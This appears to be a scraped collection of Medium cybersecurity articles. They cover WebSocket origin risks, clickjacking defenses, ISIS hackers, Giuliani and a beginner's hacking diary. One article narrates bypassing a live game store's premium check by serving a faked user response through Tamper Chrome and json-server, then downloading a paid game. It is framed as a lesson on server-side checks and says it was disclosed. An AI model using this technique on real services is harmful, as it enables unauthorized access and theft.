WebSockets not Bound by SOP and CORS? Does this mean…,https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc?source=tag_archive---------3-----------------------,"Since there is currently a lack of resources on the web explaining how to test WebSocket (WS) implementations, I decided to give an internal presentation on WebSockets, what they are, security considerations surrounding them, and of course, a methodology for testing. During that session, an interesting question was raised,
“Since WebSocket connections are not bound by the SOP and CORS, could we cause the browser to establish a cross-origin connection from a client on origin a, to a WS server on origin b, then access response data successfully?”
Short answer, Yes. The cross-origin resource standard is used ONLY to enable browsers to issue cross-origin XHR, media, script, stylesheet, and WebGL texture HTTP requests then grant access to that data to other domains. While the client uses an HTTP handshake to establish a WebSocket communication channel, client-server communication occurs over the WS protocol (i.e., ws:// or wss://). Simply put, cross-origin data access restrictions imposed by the SOP as well as custom CORS policies would not apply to data transmitted via WebSockets as CORS only places such restrictions on HTTP responses.
Continued reading of this blog will provide a deeper understanding of CORS, and why it is not applicable to WebSocket data. Further, I will discuss what type of WS data can be accessed cross-origin, and demonstrate how an attacker could successfully establish and transmit data between a WS client and WS server on different domains.
By default, modern browsers adhere to the SOP which is a security mechanism that places limitations on how the requesting origin can interact with resources retrieved from another domain if the origins differ. To limit the security ramifications of cross-origin requests, browsers restrict access to a cross-origin response in accordance with the SOP.
CORS is a mechanism that enables browsers to retrieve then grant access to resources via requests originating from a different domain than that of what is currently being browsed. Developers utilize CORS to relax or disable the SOP entirely to allow front-end applications to access cross-origin resources.
Cross-origin HTTP requests occur when a client issues a request from an entirely different domain, port, or using a different protocol than the domain currently browsed. An example of a cross-origin request would be if a request from https://example.com is issued to http://example.com:3000.This would be a cross-origin request due to the different protocols (HTTPS ->HTTP) and ports (443 -> 3000).
CORS policies inform the browser which domains are allowed to access the response object of a request, if cookies should be sent within requests, and which HTTP methods are allowed via HTTP response headers (just to mention a few restrictions that could be imposed by CORS policies). The cross-origin resource standard includes several HTTP headers; however, I will mainly focus on the Access-Control-Allow-Origin header as it permits browsers to grant cross-origin access to response objects.
As mentioned, the Access-Control-Allow-Origin header informs the browser whether or not to grant the requesting domain access to the response object. The value of this header specifies the origin(s) that is permitted to access the response data. Examples of this will be:
Access-Control-Allow-Origin: http://example.com
and
Access-Control-Allow-Origin: *
where the first header informs the browser to limit resource access to http://example.com, and the second informs the browser to grant resource access to all domains. Let us take a look at a cross-site request and response to paint a clearer picture.
The request headers above shows an HTTP GET request originating from http://evil.com to retrieve info.png from http://example.com.
The response to the cross-site request (above) informs the browser that info.png should only be accessible to thehttp://example.comdomain. The browser will issue the GET request and receive the content; however, it will not grant access to the response object to http://evil.com due to the origin restriction set by the Access-Control-Allow-Origin header.
It should be understood that CORS enables cross-origin access to response objects. Considering that, even without the presence of the custom CORS policy, browsers will prevent access to response objects of cross-origin requests, so access to the response will not be granted.
At first, it may seem a bit confusing as to why access to WebSocket data cannot be restricted by the SOP or a CORS policy when it is required that a WS client issues an HTTP GET request to initiate the handshake with the WS server. There are two aspects of the WebSocket protocol that renders the SOP and CORS restrictions ineffective: (1) no HTTP response data is required to complete the WS handshake workflow, and (2) data transfer occurs over the WebSocket protocol (ws or wss).
The WebSocket handshake between a client and a server occurs via HTTP Upgrade request and response headers. Since the SOP can only control domain access to HTTP response objects, a malicious user could cause the browser to disclose the WS server’s response headers to an attacker-controlled client. Although attackers could gain access to this data, WS response headers will most likely not to contain any sensitive data. The code snippets below include an example of request and response headers exchanged during a typical WS handshake initiation.
The WebSocket protocol only uses the HTTP protocol to establish a connection between the client and the server. WebSocket channel data transmission commences over ws:// or wss://, WebSocket and WebSocket Secure respectively. As I alluded to previously, the SOP prevents, and CORS enables browsers to access cross-origin XHR, media, script, stylesheet, and WebGL texture HTTP response data. Therefore, since the SOP only pertains to HTTP response data, the SOP cannot instruct the browser to restrict access to data transmitted via WebSockets.
With SOP’s lack of ability to enforce access controls on WebSocket data, attackers could establish a cross-origin WS connection channel, to send malicious data to the WS server as well as expose any data transmitted to the “subscribed” WS channel. The subsequent section outlines how an adversary may go about achieving this.
An attacker could create a WS client to initiate a WS handshake with a web server that supports WebSockets (denoted by an HTTP 101 Switching Protocols response). From there, the malicious entity could potentially gain unauthorized access to cross-origin WS data.
To demonstrate this, I will use a sample proof-of-concept that one of our Junior Analysts, Paul Yun, and myself put together. You can find it here. This Node.js PoC contains a Support Live Chat app (hosted on localhost:3000), and a Cross-Origin WS Client (hosted on localhost:9000) — which utilize the Socket.io JavaScript framework to integrate WebSocket support.
Socket.io framework includes a client API that makes developing WS clients straightforward. Below is a code snippet of the Cross-Origin WS Client’s front-end JS code within index.html(external scripts and HTML omitted).
The front-end Cross-Origin WS Client has the ability to initiate a WS handshake with a cross-origin WS server, and send messages to and retrieve broadcast messages from that WS server.
The WS client’s code for the Support Live Chat app is similar to the client for the Cross-Origin WS Client. Instead of establishing a cross-origin WS connection, this client connects to the WS server on its own domain, creating a same-origin connection. To achieve this, we used const socket = io(); instead of const socket = io(target); to initiate the WS connection to our Support Live Chat’s WS server.
The Support Live Chat’s WS server listens for WS handshakes originating from any domain, then establishes a WS communication channel with the requesting WS client. The purpose of this WS server is to emit (broadcast) messages received from WS clients to subscribers of the WS server’s channel. Our WS server’s Socket.io JS code is shown in the snippet below.
Now that we have a cross-origin WS client let us attempt to establish a WS connection with a server that does not support WebSocket connections. We can test this by using our cross-origin WS client to initiate a WS handshake with the support chat’s server while the Socket.io implementation commented out.
As expected, the browser does indeed block the cross-origin request to a server that does not support WS as the WS handshake occurs over HTTP, and the browser receives an HTTP 404 response without the Access-Control-Allow-Origin header set to http://192.168.1.160:9000 or *. If the Access-Control-Allow-Origin were properly set, the browser would have exposed the HTTP response to the front-end application, in this case, Cannot GET /socket.io/.
Let us observe how the brower handles a cross-origin WS HTTP Upgrade request with a server that supports WS but without the Access-Control-Allow-Origin set.
As shown in Figure 2, the WS server receives the cross-origin HTTP Upgrade request, then establishes a cross-origin connection without interferece from the browser due to the SOP. As mentioned above, a WS HTTP Upgrade response has an empty body the browser does not have any data to place restrictions on hence the lack of console log error messages.
As the SOP fails to enforce the browser to prevent cross-origin WS connections, we do not expect CORS to be effective as it relaxes or disables the SOP. Further, since WS do not support custom headers within WS handshake requests and responses, a CORS policy cannot be inserted into an HTTP Upgrade response per the WS RFC.
Considering we have the ability to establish cross-origin WS connections, and WS communication occurs over the WS protocol, the Cross-Origin WS Client will be able to send malicious data to the WS server as well as expose any data transmitted to the “subscribed” WS channel (at the time of writing). Figures 3 and 4 depict cross-origin WS communication between a legitimate user of the Support Live Chat application and a cross-origin attacker.
Due to the lack of effectiveness of the SOP and CORS, every WebSocket server implementation should verify the origin of HTTP Upgrade request to prevent cross-origin WS connections. Doing so will further improve the security posture of a WebSocket implementation by building upon security controls that are paramount and should be in place (e.g., authentication and authorization checks).
Socket.io recognizes the potential ramifications of the WS protocol’s overly permissive manner and provides such functionality by providing an additional of server option key-pair. Other widely used WS frameworks should offer similar features as well.
Drew Branch, Security Analyst @ Independent Security Evaluators
Twitters: @ISESecurity
Written by
","['About', 'Threat Feed', 'ISE Labs', 'Blockchain Security', 'Blog Archive', 'JavaScript', 'Hacking', 'Cybersecurity', 'Privacy', 'Web Development']"
We’re hearing mixed reports on the Islamic State’s supposed tech savvy. But does it even matter?,https://medium.com/umdplex/were-hearing-mixed-reports-on-isis-s-supposed-tech-savvy-but-does-it-even-matter-32219d6ed73f?source=tag_archive---------9-----------------------,"Last August, 21-year-old British-born Pakistani Junaid Hussain logged into the Islamic State Hacking Division’s Twitter account to post a new message. “NEW: U.S. Military AND Government HACKED by the Islamic State Hacking Division!” Hussain wrote, adding a link to a 30-page document.
“[W]e are in your emails and computer systems, watching and recording your every move, we have your names and addresses, we are in your emails and social media accounts,” the document read, according to a U.S. Department of Justice statement. “[W]e are extracting confidential data and passing on your personal information to the soldiers of the khilafah, who soon with the permission of Allah will strike at your necks in your own lands!” The rest of the document listed page after page of names, email addresses, passwords, locations and phone numbers for more than 1,350 American military and government personnel.
While Americans trembled to read the messages, experts shrugged off the cyber terrorist attack and others like it as as unsophisticated. Media and intelligence agencies found that documents containing much of the government personnel data from this and other similar “hacks” were publicly available, just a few Google searches away. Data dumps and Twitter hacks can’t match up to the U.S.’s recent debut of “cyber bombs” against Islamic State fighters. But does it matter?
Yes, the terrorist network’s disorganized, underfunded guerrilla cyber jihadis are no match for the NSA’s highly-trained and equipped army — but our total reliance on a massive technology infrastructure might make us even more vulnerable whenever Islamic State recruits hit upon a winning strategy. In other words: our advanced cyber skills may come back to bite us.
The Internet underlies virtually all of America’s critical infrastructure activities, including military, defense, commerce, finance, energy, transportation and healthcare. “[O]ur reliance on things like satellites and the Internet has led to real vulnerabilities that our adversaries are eager to exploit,” Defense Secretary Ash Carter said at a technology forum in September 2015. Attempts by terrorists at penetrating our power grid, industrial control systems and financial transactions are inevitable. A 2015 USA TODAY analysis of federal energy records found that part of the nation’s power grid is struck by a cyber or physical attack about once every four days. But the Internet of Things, increasing interconnectedness of technology, and rise of drones and self-driving cars will make the U.S. even more vulnerable to being hacked. A smartly-targeted, asymmetrical attack could bring the country to its knees.
Is the Islamic State capable of producing such a destabilizing feat? The consensus among cybersecurity experts and defense officials is a resounding no. The young men behind the “hit list” of U.S. military and government personnel were two of the Islamic State’s most advanced hackers. And both are now out of the picture: Junaid Hussain was killed in an American drone strike on Syria later that month, and his accomplice Ardit Ferizi has been extradited to Virginia, where he faces up to 35 years in jail. In December, online threat intelligence company Recorded Future told the New York Times that it has seen no indication that the Islamic State’s cyber operations have recovered from losing Hussain and Ferizi. The Times also spoke to security researchers, who said the Islamic State’s cyber capabilities are not much more sophisticated than those of your average teenage amateur hacker.
But while the Islamic State’s operations may be insufficient to strike such a strategic blow currently, experts and officials say we cannot afford to get cocky. While the Islamic State’s hacking groups are still operating unofficially with with little funding or organization, a new report from Flashpoint finds that the merge of several previously disparate pro-ISIS hacking collectives into the new United Cyber Caliphate is of “high concern.”
“Until recently, our analysis of the group’s overall capabilities indicated that they were neither advanced nor did they demonstrate sophisticated targeting,” Laith Alkhouri, Flashpoint’s director of Research & Analysis for the Middle East and North Africa, told media in a statement. “With the latest unification of multiple pro-ISIS cyber groups under one umbrella, there now appears to be a higher interest and willingness amongst ISIS supporters in coordinating and elevating cyber attacks against governments and companies.”
That’s in line with what defense officials are saying. Adm. Michael Rogers, commander of U.S. Cyber Command, warned the Senate Armed Services Committee this month that it “would not be difficult” for ISIS to conduct cyberattacks on critical U.S. infrastructure. “It’s not beyond their ability if they made that decision,” he said, though they do not yet “view cyber as a weapon system.” That very real threat, combined with the small-scale, unadvanced Islamic State attacks we see sprinkled throughout the country, create a culture of anxiety where amateur hacks of Twitter accounts can cause disproportionate fear.
In the end, that’s what terrorism is about.
Written by
","['Race & Ethnicity', 'Women', 'LGBTQ+', 'Health', 'Technology', 'Politics', 'Culture', 'ISIS', 'Cybersecurity', 'Tech', 'Terrorism', 'Middle East']"
What Cyber Security taught me about Life Insurance - Tianxiang Zhuo - Medium,https://medium.com/@TXZhuo/what-cyber-security-taught-me-about-life-insurance-62faf62b2631?source=tag_archive---------7-----------------------,"What Cyber Security taught me about Life Insurance
I have been enamored with both insurance and cyber security startups as an investor over the past 2 years but have always assumed that these were two separate interests of mine that managed to find a random meeting point in my life. I have been extremely fortunate to be an investor in Cirrosecure (acquired by Palo Alto Networks), Prevoty and InAuth, three thriving startups which I believe will form the pillars of cyber security in the future. In late 2014, I went on a hunt to find a startup that was keen on disrupting the online insurance market and thanks to my good friend Roseanne Wincek, I came to know two eager and highly talented founders, Jennifer Fitzgerald and Francois de Lame who were trying to disrupt the online insurance distribution model through their platform called PolicyGenius (you should Google the original name they came up with). After a year together, 4 board meetings and an additional $20M in the bank, I am blessed to have the both of them as friends and chalked it up to another fortunate chapter in my book of life.
So it was with interest that I read the TechCrunch article on Cockroaches vs Unicorns: The Golden Age of Cybersecurity startup as part of our daily reading as a team. Interesting data — expected that. But insightful? Didn’t see that one coming. Yes, the article was supposed to discuss the future of the cybersecurity ecosystem, but what stood out were the parallels they drew between cyber security and life insurance. The two disparate interests I had were not so anymore. While insurance and cyber security are two very different industries, the purpose they serve, value to the customer, the way they should be sold and what makes them so compelling as investments are strikingly similar. That “Aha” moment made me realize how I should be helping my other portfolio companies and improve my judgment as an investor
1. Consumer education needs to be data-driven but stay away from threats
I find it hard to do business with people who sell based on fear, “What will happen to your kids when you pass away?” or “Think of how much money you could lose if your servers went down for a day”. I am not asking you to downplay the risk factors but make your argument using actual data, probabilities and honest counsel. 83% of Americans don’t buy life insurance as they believe it is too expensive. $400 is what most Americans believe a 20-year, $250,000 level term life policy for a healthy 30-year-old costs annually. It actually costs $150 and more than half of that 83% would consider it to be affordable. Would that change your opinion on getting a life policy?
2. Choices are a good thing, but today’s consumer is overwhelmed with choices and desperately needs guidance
There are 18 million ‘stuck shoppers’ in the US who want life insurance but have been derailed in the shopping process largely due to the overwhelming number of options. The most common words you would hear if you attend a meeting with Chief Security Officers (CSO) is cyber threats and they want to know how to deal with it. Like life insurance shoppers, they are being approached by different software vendors who all sell the promise of helping them cast away all their worries. The 3 cyber security startups I invested in are all building a product in response to a specific, yet sizeable threat and have made that crystal clear in their messaging. Take Prevoty for example, organizations these days run multiple applications and the number will continue to grow. Instead of having a one size fits all security solution, organizations now need tailored security platform for each of their applications. Guiding the CSO to understand the problem, its magnitude and how your platform will fix that is what Prevoty does well.
3. “You can check-out any time you like, but you can never leave! “
Hotel California is one of my favorite songs of all time. I remember trying to learn the riff on the guitar back in high school, but could never quite master it. Perhaps not being able to leave might be too harsh a way to describe insurance and cyber security startups, but in a way it is true. Technological changes notwithstanding, insurance and cyber security is something that individuals and businesses will always need and will always pay for. The lifetime value of a customer is incredibly long and it makes no sense for customer who has been diligently paying their monthly payments to give up their insurance policy or security platform as if something goes wrong thereafter, then all the previous payments would have gone to waste. I challenge myself and entrepreneurs out there to create business models where the consumer is incented to continue with their monthly payments.
Ok, I shall end my post with a honest confession. I still have not bought a life insurance policy. I know, i know… and that is one of the first things on my ‘to-do’ list for 2016.
Sources: TechCrunch, LIMRA
Written by
","['Cybersecurity', 'Tech', 'Venture Capital']"
What Does Rudy Giuliani Actually Know About Cybersecurity?,https://medium.com/war-is-boring/what-does-rudy-giuliani-actually-know-about-cybersecurity-77a10d1428f8?source=tag_archive---------7-----------------------,"by JASON KOEBLER & LORENZO FRANCESCHI-BICCHIERAI
Rudy Giuliani is going to head a new Cybersecurity Working group for U.S. president-elect Donald Trump’s transition team, a move that has caused many to reflexively wonder — what does the former mayor of New York City even know about cybersecurity?
That’s probably a fair question, because Giuliani served as an undisciplined attack dog for Trump during the campaign, saying a large number of patently and provably false things on a wide array of topics.
It is concerning to some that Trump will put him in charge of solving the very real problem of preventing foreign governments from using hacking to undermine our democracy and getting private corporations to treat cybersecurity as vitally important to the economic, security and privacy interests of their businesses, employees and customers.
But Giuliani is not an unqualified pick for this position, just a cynical one.
Since 2003, his consulting firm Giuliani Partners and its subsidiary Giuliani Security and Safety has at least nominally advised clients on cybersecurity, but people who have worked with his firm say the advice is focused more on liability mitigation for companies rather than implementing best security practices.
“If you hired them on a cyber engagement, they are going to tell you what your legal obligations are and how to manage the legal risk related to cyber,” a cybersecurity executive in New York who has experience with Giuliani Security and Safety and requested to remain anonymous told Motherboard. “Basically, not to prevent a Target [breach], but how to prevent a Target CEO being fired.”
Giuliani’s general interest in the sector seems to come from its emerging growth — in a November interview with Marketwatch, he characterized the company’s early interest in cybersecurity as a smart market grab.
In 2007, after Giuliani joined the law firm Bracewell LLP with a security focus, the Associated Press noted that it was almost entirely an attempt for the firm to cash in on Giuliani’s connections and name recognition, not his lawyerly or technical expertise.
This is consistent with some of the former mayor’s earliest interviews on the subject. A 2003 New York Times article announcing Giuliani Partners’s earliest forays into the cybersecurity world asked him to discuss a common cybersecurity vulnerability.
“I could make a comment on the Cubs game tonight,” Giuliani jokingly told The Times. Four years later, in a 2007 article, The Times described Giuliani Security and Safety as something of an interesting but growing side project.
Unlike many other cybersecurity firms, Giuliani Partners does not publish white papers about malware and large-scale hacks, or push for increased adoption of encryption, which would enhance cybersecurity across the board. In fact, it doesn’t talk much about cybersecurity at all, instead choosing to focus on its more traditional anti-crime consulting work.
Giuliani Partners’ website promotes its crime reduction successes in countries like El Salvador, Colombia, Mexico and the Dominican Republic, not its cybersecurity work. Some of the only publicly available cybersecurity work the company has ever done came in 2003, after the firm investigated an electronic betting scandal for the National Thoroughbred Racing Association.
In other words, Giuliani is a lawyer, not a cybersecurity expert.
While the work of Giuliani’s firm is “comprehensive” and “well thought out,” the NYC executive said, it’s “not something I would expect an infosec engineer in the trenches to respect.”
“Lawyers are risk managers and their work product is high level management of risk, not incident response,” the source added. “If an engineer is a firefighter, the lawyer isn’t even the building inspector trying to prevent future fires, the lawyer is the guy writing the building code with an eye to prevent fires, but managing other competing interests too.”
But Giuliani isn’t even writing building code. He has published nothing for GreenbergTraurig law firm’s cybersecurity practice, where he took over as chair in January 2016. The group, meanwhile, has published papers lamenting European Union privacy regulations and a spate of class action lawsuits related to consumer data privacy.
Here is a sampling of Giuliani’s “news coverage” GreenbergTraurig has decided to highlight.
According to Alexander Urbelis, a New York-based infosec lawyer at Blackstone Law Group, Giuliani’s past as a successful prosecutor could signal the direction Trump wants its administration’s cybersecurity efforts to be … more clamping down on cybercime rather than anything else.
“On the one hand it’s cronyism at its best, on the other hand Giuliani is not a bad person when it comes to law enforcement,” Urbelis said, alluding to Giuliani’s close relationship with police. It should be noted, though, that Giuliani’s legacy includes enacting the controversial stop-and-frisk policy.
Earlier this month, at the annual Consumer Electronics Show in Las Vegas of all places, the company partnered with BlackBerry to “take advantage of BlackBerry’s leadership in secure mobile communications technology to assess infrastructures, identify potential cyber security vulnerabilities, address gaps and secure endpoints.”
In the past, it should be noted, BlackBerry has suffered major security issues — namely that it has been willing to intercept and decrypt messages for Canadian law enforcement and its devices have been found to have serious security flaws.
When Giuliani does talk about cybersecurity, it’s not in a sophisticated way.
“You should see the technologies — they’re great,” Giuliani said in December 2016, speaking to Fox News’s Sean Hannity about the state of cybersecurity in Israel. “And the thing is to then do that and have your phone number changed, but have it done automatically so your phone number never changed but it really changed.”
Giuliani has yet to form a coherent position on the encryption debate, perhaps because it pits his hardline law-enforcement approach to security directly against the idea that more encryption is better for the security of all, which is common wisdom in the infosec community he purports to be a part of.
“When it comes to encryption, and digital technology more broadly, there is, unfortunately, no one-size-fits-all solution,” he told the House Homeland Security Committee in February 2016. “This is a complex and difficult challenge, and it is imperative that we tackle it directly, comprehensively and with the future in mind.”
Giuliani continues to be what he has been since the 9/11 attacks — a law-and-order hardliner with international name recognition. We don’t know what, if anything, Giuliani’s group will actually do under Trump. He’s spent much of his later career racking up ceremonial job titles. This might just be one more.
“Honestly, it sounds like a nothing job,” the unnamed cybersecurity executive said. “A hat-tip for the help during the campaign. ‘We don’t have a real job for you, so tell us some B.S. title to give you that will help your career outside of government and we’ll do it.’”
Originally published at Vice Motherboard.
Written by
","['Air', 'Land', 'Sea', 'History', 'Culture', 'Politics', 'Store', 'Cybersecurity', 'Privacy', 'Rudy Guiliani', 'Wib Politics']"
What do you know about Clickjacking? - Security and Node.js,https://blog.nodeswat.com/what-do-you-know-about-clickjacking-afc4c5522a34?source=tag_archive---------1-----------------------,"Clickjacking, also known as a “UI redress attack”, is an attack vector where multiple transparent or opaque layers are used to trick a user into clicking on a button or link on different page than visually seen by the user. Thus, the attacker is “hijacking” clicks meant for your page and routing them to another page for various reasons.
Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker.
On the example above, you can see how a clickjacking attack works. The user is shown a trap website with a snare button — the button is made to look attractive for the user to click on. However, in reality an invisible iframe is positioned on top of the button in such a manner that the target buttons are aligned.
In this example it is an account delete button from another website (if the user is logged in on that site, then the iframe will properly render the button in the right location). So instead of clicking on the supposed “Win”, they will instead click on the “Delete” button.
This is a simplified example of the attack, but it can be used to do a lot of damage depending on the target.
The more famous examples of clickjacking include Twitter and Facebook worms that surfaced around 2010 and 2011. These clickjacking attacks used the user’s click to add the malicious URL to their social media. This in turn would attract more users to click the link and so it propagated fast throughout the user base.
Clickjacking is a product of clever UI modifications using your site’s content in an iframe. So in order to defeat the attack vector you must not allow your site to be used inside an iframe except in a manner you specify.
A regular website has little use cases where they should allow their website inside an iframe. That is why zero tolerance is usually a good way to go. There are some cases where you would want specific pages to be usable in an iframe — widget inclusion and such — and therefore require lifting the zero tolerance for those specific instances.
How to achieve this?
Browser vendors, fortunately being fully aware of the dangers of this, have implemented X-Frame-Options and Content-Security-Policy headers, which we can be used to prevent framing our website.
You might be wondering why there are two different headers for this purpose. Well the X-Frame-Options, which is more supported across the various browser vendors, was never actually standardised. In contrast, the new Content-Security-Policy (CSP) is a standardised header meant for mitigating various content related security issues. Unfortunately it is not yet fully supported by all browsers.
When you expect users with older browser versions to visit your site, then there is also a third option called frame-busting, which is a combination of CSS and JS designed to inhibit framing your website.
We will look at all three methods in turn.
The X-Frame-Options is currently the best vendor supported solution against clickjacking attacks.
There are three possible values for X-Frame-Options:
The ALLOW-FROM option has limited support and is therefore not recommended. Instead, use one of the other two options. Because X-Frame-Options header has no method to define the pages where it applies, then you will have to handle this part yourself. That usually involves setting it by default and removing it only on the pages you require to work inside an iframe.
For a zero tolerance (which is usually what you need) I would set up a middleware high up the stack if using express
Or if you are using a proxy server like Nginx in front of your Node.js application, then you can set it there:
When you do have routes that have to work inside frames, then you will either have to set the header on all routes that are not allowed, or if possible, set the header for all routes and remove where needed, by setting it to empty.
The Content-Security-Policy header is a new standardised header for specifying content related policy. This includes the frame-ancestors directive that is used to prevent clickjacking attacks.
The frame-ancestors takes a source-list of allowed parents as an argument. You can use the following built in keywords:
Or directly specify the URLs that can frame the site.
Implementation is very similar to the X-Frame-Options. Set the header as broadly as possible in your application stack:
The problem with CSP header is that the support for frame ancestors and CSP is very limited — only the newest version of Chrome, Firefox and Opera have actual support. However, because CSP is a standardised header, we can expect to see the X-Frame-Options die out and be replaced by CSP as browser vendors catch up.
Because the support for the X-Frame-Options and Content-Security-Policy headers is not yet complete, there exists a third option called frame-busting. It involves using a combination of CSS and JavaScript to stop the website from being included in frames.
More specifically, it means including the following block in the head part of the html document:
Let’s analyse a bit what this code does:
With this code, the content loading will not be stopped in the framed page. Instead, the content will not be shown and therefore the user won’t be able to interact with the page.
The frame-busting solution is the most reliable of the three available options, because it doesn’t rely on the browsers support. However, on the downside, your site will become unusable for people who have JavaScript disabled.
Clickjacking or UI redress attack is an attack vector designed to steal a user’s click by covering the intended click area with an invisible frame that is housing a different action. It can also be used to target input elements with the aim of hiding the true input from the user.
Defending against this attack vector means controlling which parts of the web application can appear inside frames. It boils down to three choices — using a Content-Security-Policy header, an X-Frame-Options header or using CSS and JavaScript in what is known as frame-busting. The first two rely on the browser’s security implementations to achieve the result, while the third is applicable even with old browsers.
Taking this into account, I would recommend using both of the headers if you do not plan to support older browsers or want to allow scriptless browsing of your application.
If indeed your target audience is likely to have older browsers then frame-busting is much more universally functional and should be the prime choice.
This was part two of the Node.js Web Application Security Series focusing on various web application security topics and how they can be mitigated in Node.js applications.
Sufficient knowledge about web security is something every decent developer should know. Even if you are not security oriented, this knowledge will be useful for designing more robust and secure systems. This in turn makes you a better developer overall.
If you find these mini tutorials useful, I recommend that you buy and read my book “Secure Your Node.js Web Application: Keep Attackers Out And Users Happy”. The book provides more in depth and practical knowledge about Web Application Security and implementing security mechanisms in Node.js applications.
Originally published at nodeswat.com on January 27, 2016.
Written by
","['Nodejs', 'JavaScript', 'Cybersecurity']"
What Google’s CEO Couldn’t Explain to Congress - The Atlantic - Medium,https://medium.com/the-atlantic/what-googles-ceo-couldn-t-explain-to-congress-fed97ef4d6f0?source=tag_archive---------0-----------------------,"The parade of Silicon Valley figures to Capitol Hill continued today when Sundar Pichai, the CEO of Google, the core of the Alphabet holding company, went before the House…
Written by
","['Google', 'Business', 'Politics', 'Privacy', 'Cybersecurity']"
What Happens When a Shitty Coder Builds Your Backend,https://medium.com/hackernoon/what-happens-when-a-shitty-coder-builds-your-backend-4cb0a57ff6ef?source=tag_archive---------9-----------------------,"NOTE: For security reasons, the actual web services involved in this will not be named, so for the sake of this article I will invent a fictional online game store, called Theseus Games (TG) with fictional URL: https://theseus-games.co.uk.
I recently tried to buy a new game from TG which unfortunately was only available to Premium members (TG has two membership levels, Basic and Premium), and the Premium membership was expensive as hell. I bit my nails for a while and wondered what I could do since my future happiness seriously depended on playing several hours of said game as soon as possible. Since I’m a software engineer myself, I decided to see if I could just play around with TG’s services for a while and just see how things worked.
I reloaded TG’s game purchase page with my Chrome DevTools open in order to see what requests the website makes. First thing I noticed was that TG uses AJAX to load some of its Javascript assets, about a dozen of them. Two of these scripts caught my eye: user.js and purchase.js, and I swiftly opened them up to see what treasures were buried within.
Of course, I had built several apps with React and React Native and I immediately realized that the web frontend was built with React, communicating with a Laravel backend (I got this from the session cookies). If you know a little Javascript (or pretty much any web language haha), you can work your way through these snippets.
Apparently, user membership information is indicated through an active field in a User entity, and only users where active is either 2 or 33 can be allowed to get the game. Of course the numbers must represent membership levels, and either 2 or 33 indicated Premium membership, and since I was getting the message: ‘Sorry! This game is only available to our premium members’, my active field most definitely wasn’t 2 or 33.
Further down the line in the DevTools request tab, I saw the actual GET /user API request, and I found this response:
Apparently, my active field was 22, which is how the web app knows to deny me access.
Immediately, I fired up Postman in order to make API requests to update my active field. From DevTools, I copied out my current session cookie and the X-XSRF-TOKEN header value as well into Postman, and I tried to make a PUT request to https://theseus-games.co.uk/application/user/60088 with payload:
But I immediately received a 405 (Method Not Allowed) error, meaning users are updated in a different route. In turn, I tried POST /application/updateUser, POST /application/updateUserInfo and got 404s for both. At this point, I decided to abandon this approach entirely and try something else. (If I wanted to continue, I’d have inspected the other *.js files that were downloaded via AJAX to get the specific route for updating user, or just go to my account page and try to update my account, then retrieve the route; but there are many ways to skin an elephant haha.)
I have this cool Chrome extension called Tamper Chrome which is used to (surprise!) tamper with requests in the browser, and modify request headers, payloads, etc. The next approach I tried involved me tampering with the actual API requests, and there were two things I could easily try:
1. Download a copy of https://theseus-games.co.uk/assets/js/purchase.js, and modify the if condition checking the active field and then place it in my local server (e.g./var/www/html/web/purchase.js), then modify the outgoing request to https://theseus-games.co.uk/assets/js/purchase.js and change the request path to http://localhost/web/purchase.js, so it serves my local version instead.For my local modification, I could simply change:
to:
2. In a similar manner to (1), I could serve a local version of https://theseus-games.co.uk/application/user and simply return a user object with the active field conveniently modified, then modify the AJAX request path to my local version. I mean something like:
I opted for (2) and did this with the beautiful json-server node package. I created a simple test.json file with contents:
Then I started json-server:
Next, I activated Tamper Chrome in order to reroute all further requests from current tab:
And I reloaded the page. Soon enough, the AJAX request for https://theseus-games.co.uk/application/user came up, and I simply modified that to my local json-server:
Of course, the request hit my json-server which happily responded with a few sweet bytes.
That was all I needed to do, so I decided to click the Purchase button again, and of course, all the frontend could see was that I’m a privileged TG member (haha!); then there was a loading indicator and next thing, a popup thanking me for using Theseus Games (My Pleasure, folks), and the game was rapidly downloaded to my computer.
I swiftly abandoned all earthly concerns and dedicated the next few hours of my life to the game, and when I was mentally and psychologically exhausted, I lay on my bed in solemn contemplation of just what the unfortunate folks at TG could have done to further protect their wares.
The Golden Rule here, ladies and gentlemen, is to always do both a client-side and a server-side check of all sensitive components of your web applications. In TG’s case, on the server side, at https://theseus-games.co.uk/application/purchaseGame, they didn’t, but should have simply verified my active field again, to ensure that I was authorized to purchase said game, which is actually a trivial check to make. Unfortunately, this is a mistake several web developers (newbies and even old-timers) still make when building web services, and frequently fail to tighten up their security so if you build web services, please pay a little bit more attention in the future.
Thanks for reading, folks. Share with friends and leave your feedback below. Much love.
PS: As stated above, there is no Theseus Games (TG) and https://theseus-games.co.uk doesn’t exist. I’ve notified the actual company in question (not a game store, sorry) and they have resolved this issue.
Originally published at https://elijahoyekunle.com.
Need help with your web app? Contact me! — Twitter — Github — LinkedIn
Written by
","['About', 'Help', 'Go Home', 'JavaScript', 'Cybersecurity', 'Web Development', 'Technology', 'Tech']"
What I have learn in my first month of Hacking and Bug Bounty?,https://medium.com/@unknownuser1806/what-i-have-learn-in-my-first-month-of-hacking-and-bug-bounty-dc1a4be58294?source=tag_archive---------6-----------------------,"Hi , In this post I will share everything about hacking , programming and bug bounty , CIFs etc available resources in come across. If you don’t know anything about hacking, then end of this blog you will be advance in hacking.
I have just started learning hacking about 1 year ago. One day I saw a fb group about hacking and I join that group , there I see someone talking about “How can I hack with aircrack-ng?” There someone comment and explain about it.In that post hundreds of comments was posted and I was reading them.There many people started fighting, in that post someone say “I got your ip address bro, you are from pakistan” then other person says “How you expect me to not to use VPN?” . And manything…
I was like � � . I never knew, someone can track ip and know other people’s location. And also I can connect Wi-fi without owne’s permissionon.It was awesom. I immediately started googling about everything. I have learning about hacking , Those days I was learning about termux .
I was download tools from github like Hakku , IP GeoLocation , airgeddon , katana , ReconDog etc… And I was thinking myself hacker. LOL
Then after one month I have no any phone or internet connection so I need to stop my learning journey for one year.
I started learning about hacking again one month ago in 24th May
I want to be a pentester so I need CEH certificate. But I saw a problem, I can’t find any group in social media or anywhere. In facebook I come across group where people asking “How can I hack facebook?”. Same question again again and again.
So , after googling I found a term Bug Bounty .I started researching about bug bounty and I learning about many bug bounty platform like:
1. Bugcrowd
2. Hackerone
3. synack
4. cobalt
In this platforms you can find bug exchange with money. But remember never ever work for money.
“If you do what you love, you’ll never work a day in your life ”
- Marc Anthony
Many people rush for earning without learning. Firstly you need to focus on you learning.
